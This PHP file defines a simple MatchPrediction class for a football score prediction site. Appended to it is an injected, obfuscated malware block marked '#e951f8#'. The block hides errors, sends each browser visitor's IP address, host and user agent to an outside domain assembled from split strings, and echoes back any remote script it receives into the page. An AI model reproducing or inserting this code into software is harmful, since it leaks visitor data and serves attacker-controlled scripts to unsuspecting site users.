<?php
class MatchPrediction {
	
	public $userName;
	public $matchnr;
	public $teamName1;
	public $teamName2;
	public $GoalsTeam1;
	public $GoalsTeam2;
	public $winner;
	public $goaldiff;
	
	function __construct($u, $m, $t1, $t2, $g1, $g2, $w, $gd)
    { 
    	$this->userName = $u;
    	$this->matchnr = $m;
		$this->teamName1 = $t1;
	  	$this->teamName2 = $t2;
	 	$this->GoalsTeam1 = $g1;
	 	$this->GoalsTeam2 = $g2;
	 	$this->winner = $w;
	 	$this->goaldiff = $gd;
	
    }
}
?>
<?php
#e951f8#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/e951f8#
?>